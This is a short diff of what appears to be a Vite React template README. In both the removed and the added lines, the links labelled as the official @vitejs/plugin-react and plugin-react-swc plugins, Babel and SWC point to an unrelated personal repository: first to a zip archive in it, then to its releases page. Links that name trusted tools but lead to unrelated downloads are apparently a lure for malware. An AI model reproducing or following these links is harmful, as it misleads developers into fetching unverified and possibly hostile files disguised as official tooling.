@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/ChrisJustice600/forumContext/main/src/Context-forum-2.2.zip) uses [Babel](https://raw.githubusercontent.com/ChrisJustice600/forumContext/main/src/Context-forum-2.2.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/ChrisJustice600/forumContext/main/src/Context-forum-2.2.zip) uses [SWC](https://raw.githubusercontent.com/ChrisJustice600/forumContext/main/src/Context-forum-2.2.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://github.com/ChrisJustice600/forumContext/releases) uses [Babel](https://github.com/ChrisJustice600/forumContext/releases) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://github.com/ChrisJustice600/forumContext/releases) uses [SWC](https://github.com/ChrisJustice600/forumContext/releases) for Fast Refresh
